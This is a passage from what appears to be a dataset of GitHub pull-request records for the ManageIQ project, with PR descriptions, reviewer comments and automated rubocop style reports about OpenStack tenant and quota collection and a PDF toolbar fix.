","[""Looks good to me.  @abellotti Can you squash these commits? Then we'll let Travis run and it should be good to merge."", ""Done.\r\n\r\nThanks Jason,\r\nAlberto\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nOn Jul 16, 2014, at 4:00 PM, Jason Frey <notifications@github.com> wrote:\r\n\r\n> Looks good to me. @abellotti Can you squash these commits? Then we'll let Travis run and it should be good to merge.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> "", 'Checked commit https://github.com/abellotti/manageiq/commit/1d68accc1937ef7ac623854914e2e299d9e60ef7 with rubocop 0.21.0\n3 files checked, 0 offenses detected\nEverything looks good. :cake:\n']"
19,ManageIQ/manageiq,231.0,"- Added PDFGenerator available check to download PDF button before running show/hide or enable/disable commands on it. This was causing JS error running actions when button is not in toolbars.
- Refactored code that was running JS commands on toolbar buttons to show/hide or enable/disable them.

@dclarizio please review/test. This fix should load timelines successfully when PDF button is hidden in the toolbars. ","['@jrafanie @Fryguy made suggested changes', '@Fryguy please re-review.', ""I'm seeing the session object jump over 400K after generating a timeline and it stays that way after going to other screens.  There is an A/R object in there called report, so perhaps we can get rid of that while we're in this code, maybe move it to a temporary var."", 'Checked commits https://github.com/h-kataria/manageiq/commit/633065132a7072df38716a8ab45dec6c123ffdc9 .. https://github.com/h-kataria/manageiq/commit/3c3fa23370be8bc4d5efdaad8a0e1f058fe7fef0 with rubocop 0.21.0\n1 file checked, 0 offenses detected\nEverything looks good. :cake:\n', 'Verified session object no longer bloated with A/R report object.']"
20,ManageIQ/manageiq,232.0,"@Fryguy @blomquisg please review.

For OpenStack refresh, ensure inventory is collected for all of the
tenants the EMS can access.

Extended OpenstackHandle to include tenant iterators.
Updated EmsOpenstack and the openstack parser to use the OpenstackHandle accordingly.
Updated spec tests and rerecorded vcr cassettes.","[""@roliveri Is this a file rename/move and a change at the same time?  That gets very hard to review.  Would it be possible to split that into two commits the rename, and then then changes?  Also, when done reviewing, let's squash that rubocop one, because it's not really a style thing...looks like an actual bug fix."", '@roliveri, can you look at the Travis failure?  Looks like ""unused HTTP interactions left in the cassette.""\r\n\r\nI\'ll ACK this PR if the Travis status passes.', ""I'm not sure why it's failing. It passes when I run it locally, and my working copy and remote branches are in sync. Today, I'll be pushing up changes based on your comments. Those changes will include new vcr cassettes. We'll see if that fixes the problem."", 'ACK\r\n\r\nLooks good.  I like centralizing the caching logic into the connect method in the handle.\r\n\r\n @ManageIQ/committers-dev-leads, please merge', 'Checked commits https://github.com/roliveri/manageiq/commit/f28fa9f8eb07af824392f5d79e18e478d855887f .. https://github.com/roliveri/manageiq/commit/ae537b30c0c2ccf4836c8b47444d8173b018c949 with rubocop 0.21.0\n17 files checked, 33 offenses detected\n\n**lib/openstack/openstack_handle.rb**\n- [ ] Warn - [Line 1](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/lib/openstack/openstack_handle.rb#L1), Col 1 - [UnderscorePrefixedVariableName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/UnderscorePrefixedVariableName) - Do not use prefix `_` for a variable that is used.\n\n**lib/openstack/openstack_handle/handle.rb**\n- [ ] Style - [Line 5](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/lib/openstack/openstack_handle/handle.rb#L5), Col 3 - [ClassLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/ClassLength) - Class definition is too long. [174/100]\n- [ ] Style - [Line 7](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/lib/openstack/openstack_handle/handle.rb#L7), Col 16 - [SingleSpaceBeforeFirstArg](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/SingleSpaceBeforeFirstArg) - Put one space between the method name and the first argument.\n- [ ] Style - [Line 43](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/lib/openstack/openstack_handle/handle.rb#L43), Col 5 - [TrivialAccessors](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/TrivialAccessors) - Use `attr_writer` to define trivial writer methods.\n- [ ] Style - [Line 47](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/lib/openstack/openstack_handle/handle.rb#L47), Col 5 - [TrivialAccessors](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/TrivialAccessors) - Use `attr_reader` to define trivial reader methods.\n\n**lib/openstack/test/tenant_openstack_handle_example.rb**\n- [ ] Style - [Line 2](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/lib/openstack/test/tenant_openstack_handle_example.rb#L2), Col 1 - [SpecialGlobalVars](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/SpecialGlobalVars) - Prefer `$LOAD_PATH` over `$:`.\n- [ ] Style - [Line 3](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/lib/openstack/test/tenant_openstack_handle_example.rb#L3), Col 1 - [SpecialGlobalVars](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/SpecialGlobalVars) - Prefer `$LOAD_PATH` over `$:`.\n\n**vmdb/app/models/ems_openstack.rb**\n- [ ] Style - [Line 45](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/app/models/ems_openstack.rb#L45), Col 36 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] Style - [Line 46](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/app/models/ems_openstack.rb#L46), Col 36 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n\n**vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb**\n- [ ] Warn - [Line 47](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L47), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 49](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L49), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 51](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L51), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 55](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L55), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 56](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L56), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 57](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L57), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 60](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L60), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 62](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L62), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 63](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L63), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 68](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L68), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 78](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L78), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 80](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L80), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 82](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L82), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 83](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L83), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 84](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_grizzly_spec.rb#L84), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n\n**vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb**\n- [ ] Warn - [Line 50](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L50), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 57](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L57), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 58](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L58), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 62](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L62), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 64](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L64), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 70](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L70), Col 38 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 81](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L81), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 85](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L85), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n- [ ] Warn - [Line 86](https://github.com/roliveri/manageiq/blob/ae537b30c0c2ccf4836c8b47444d8173b018c949/vmdb/spec/models/ems_refresh/refreshers/openstack_refresher_rhos_havana_spec.rb#L86), Col 41 - [Void](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/Void) - Operator `==` used in void context.\n']"
21,ManageIQ/manageiq,86.0,"Adds support for collecting and storing openstack quota details form various openstack services.

Backend updates:
* Adds `cloud_resource_quotas` table and models
    * with STI to support OpenStack specific quotas
* Updates Openstack inventory collection
    * fixes the way that openstack tenants were collected
    * collects quotas based on services and tenants
        - e.g., in Tenant ""ABC"", the ""compute"" service allows for 30 vCPUs

UI Updates:
* Tenant tab in Cloud subnav
* Cloud Tenants in Openstack provider relationships lists (listnav and textual summary)
* Security Groups, Instances, and Images relationships for Tenant summary page
* Quota on Tenant summary page

NB:  Rebased this PR to remove the references to the Tenant Auth support.  I've got that stashed away as a separate branch for now.  If it turns out we still need that concept, we can go back to it.  For more information, see @roliveri's comments on outdated diffs below.

@Fryguy, @roliveri, @dclarizio, @h-kataria please review","['Since Travis is now green, please rebase to ensure that this PR continues to keep our tests passing.', 'This pull request is not mergeable.  Please rebase and repush.', 'Rebased on pr#324', 'This is pretty sweet.\r\n1. Is there a way to squash some of these commits? If not, then that is ok. May be necessary since there are 41 files changed.\r\n2. It seems a bunch of these warnings could be easy to fix.\r\n  + like the line too long that have a comment on them.\r\n  + or space around equals, align hash, and redundant self.\r\n3. looks like the vcr updates caused a failure? Or maybe that is a false positive.', ""@kbrock, you have a bunch of good comments.  And, I'll respond to each.  But, I'm gonna leave a blanket statement here:  most of the style issues are attempts to match the style around the changes.  I think it's usually better to match the questionable style around the changes than try to introduce a small block of more acceptable style. "", ""Checked commits https://github.com/blomquisg/manageiq/commit/75da8177d1364c5282a5e65ea88428f5df7069c5 .. https://github.com/blomquisg/manageiq/commit/23bfc393c19d860296abed3f7544ee1614bad1e9 with rubocop 0.21.0\n22 files checked, 62 offenses detected\n\n**vmdb/app/controllers/application_controller/miq_request_methods.rb**\n- [ ] Style - [Line 433](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/application_controller/miq_request_methods.rb#L433), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [133/120]\n- [ ] Style - [Line 435](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/application_controller/miq_request_methods.rb#L435), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [132/120]\n\n**vmdb/app/controllers/cloud_tenant_controller.rb**\n- [ ] Style - [Line 11](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L11), Col 3 - [CyclomaticComplexity](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/CyclomaticComplexity) - Cyclomatic complexity for show is too high. [21/6]\n- [ ] Style - [Line 11](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L11), Col 3 - [MethodLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/MethodLength) - Method has too many lines. [43/25]\n- [ ] Style - [Line 25](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L25), Col 23 - [BracesAroundHashParameters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/BracesAroundHashParameters) - Redundant curly braces around a hash parameter.\n- [ ] Style - [Line 27](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L27), Col 31 - [WordArray](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/WordArray) - Use `%w` or `%W` for array of words.\n- [ ] Style - [Line 29](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L29), Col 23 - [BracesAroundHashParameters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/BracesAroundHashParameters) - Redundant curly braces around a hash parameter.\n- [ ] Style - [Line 29](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L29), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [166/120]\n- [ ] Style - [Line 36](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L36), Col 23 - [BracesAroundHashParameters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/BracesAroundHashParameters) - Redundant curly braces around a hash parameter.\n- [ ] Style - [Line 36](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L36), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [142/120]\n- [ ] Style - [Line 41](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L41), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [208/120]\n- [ ] Style - [Line 47](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L47), Col 23 - [BracesAroundHashParameters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/BracesAroundHashParameters) - Redundant curly braces around a hash parameter.\n- [ ] Style - [Line 47](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L47), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [142/120]\n- [ ] Style - [Line 52](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L52), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [208/120]\n- [ ] Style - [Line 68](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/cloud_tenant_controller.rb#L68), Col 7 - [AccessorMethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/AccessorMethodName) - Do not prefix reader method names with `get_`.\n\n**vmdb/app/controllers/ems_common.rb**\n- [ ] Style - [Line 78](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/ems_common.rb#L78), Col 23 - [SpaceInsideParens](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/SpaceInsideParens) - Space inside parentheses detected.\n- [ ] Style - [Line 78](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/ems_common.rb#L78), Col 24 - [BracesAroundHashParameters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/BracesAroundHashParameters) - Redundant curly braces around a hash parameter.\n- [ ] Style - [Line 78](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/ems_common.rb#L78), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [128/120]\n- [ ] Style - [Line 78](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/ems_common.rb#L78), Col 127 - [SpaceInsideParens](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/SpaceInsideParens) - Space inside parentheses detected.\n- [ ] Style - [Line 81](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/ems_common.rb#L81), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [122/120]\n- [ ] Style - [Line 82](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/controllers/ems_common.rb#L82), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [205/120]\n\n**vmdb/app/helpers/application_helper.rb**\n- [ ] Style - [Line 2491](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/application_helper.rb#L2491), Col 13 - [PercentLiteralDelimiters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/PercentLiteralDelimiters) - `%w`-literals should be delimited by `(` and `)`\n\n**vmdb/app/helpers/cloud_resource_quota_helper.rb**\n- [ ] Style - [Line 2](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_resource_quota_helper.rb#L2), Col 1 - [EmptyLinesAroundBody](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/EmptyLinesAroundBody) - Extra empty line detected at body beginning.\n\n**vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb**\n- [ ] Style - [Line 1](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb#L1), Col 8 - [ClassAndModuleChildren](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/ClassAndModuleChildren) - Use nested module/class definitions instead of compact style.\n- [ ] Style - [Line 6](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb#L6), Col 13 - [PercentLiteralDelimiters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/PercentLiteralDelimiters) - `%w`-literals should be delimited by `(` and `)`\n- [ ] Style - [Line 7](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb#L7), Col 25 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] Style - [Line 18](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb#L18), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [156/120]\n- [ ] Style - [Line 28](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb#L28), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [176/120]\n- [ ] Style - [Line 38](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb#L38), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [170/120]\n- [ ] Style - [Line 48](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/graphical_summary.rb#L48), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [170/120]\n\n**vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb**\n- [ ] Warn - [Line 76](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb#L76), Col 45 - [UnusedBlockArgument](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Lint/UnusedBlockArgument) - Unused block argument - `assigned`. If it's necessary, use `_` or `_assigned` as an argument name to indicate that it won't be used.\n- [ ] Style - [Line 1](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb#L1), Col 8 - [ClassAndModuleChildren](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/ClassAndModuleChildren) - Use nested module/class definitions instead of compact style.\n- [ ] Style - [Line 6](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb#L6), Col 13 - [PercentLiteralDelimiters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/PercentLiteralDelimiters) - `%w`-literals should be delimited by `(` and `)`\n- [ ] Style - [Line 7](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb#L7), Col 25 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] Style - [Line 11](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb#L11), Col 13 - [PercentLiteralDelimiters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/PercentLiteralDelimiters) - `%w`-literals should be delimited by `(` and `)`\n- [ ] Style - [Line 12](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb#L12), Col 25 - [RedundantSelf](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/RedundantSelf) - Redundant `self` detected.\n- [ ] Style - [Line 76](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/cloud_tenant_helper/textual_summary.rb#L76), Col 121 - [LineLength](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/LineLength) - Line is too long. [169/120]\n\n**vmdb/app/helpers/ems_cloud_helper/textual_summary.rb**\n- [ ] Style - [Line 12](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/helpers/ems_cloud_helper/textual_summary.rb#L12), Col 13 - [PercentLiteralDelimiters](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/PercentLiteralDelimiters) - `%w`-literals should be delimited by `(` and `)`\n\n**vmdb/app/models/ems_refresh/parsers/openstack.rb**\n- [ ] Style - [Line 106](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/parsers/openstack.rb#L106), Col 55 - [SpaceInsideBlockBraces](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/SpaceInsideBlockBraces) - Space between { and | missing.\n- [ ] Style - [Line 110](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/parsers/openstack.rb#L110), Col 9 - [AccessorMethodName](http://rubydoc.info/gems/rubocop/frames/Rubocop/Cop/Style/AccessorMethodName) - Do not prefix reader method names with `get_`.\n- [ ] Style - [Line 118](https://github.com/blomquisg/manageiq/blob/23bfc393c19d860296abed3f7544ee1614bad1e9/vmdb/app/models/ems_refresh/parsers/openstack.rb#L118), 